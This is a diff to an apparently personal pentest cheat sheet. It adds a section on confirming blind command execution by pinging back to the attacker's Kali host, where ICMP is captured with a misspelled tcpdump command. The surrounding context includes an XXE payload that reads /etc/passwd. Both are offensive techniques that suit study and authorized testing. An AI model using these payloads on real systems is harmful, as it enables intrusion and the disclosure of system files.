@@ -47,6 +47,7 @@
 		- [Command injection](#command-injection)
 	- [SSTI](#ssti)
 	- [XML external entity (XXE) injection](#xml-external-entity-xxe-injection)
+	- [PING](#ping)
 	- [TAR Wildcards](#tar-wildcards)
 	- [Websites](#websites)
 
@@ -463,6 +464,18 @@ Server-Side Template Injection
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+## PING
+
+On Kali
+```bash
+sudo tcpdum -i tun0 icmp
+```
+
+On victim
+```bash
+ping -c 2 kali_ip
 ```
 
 ## TAR Wildcards
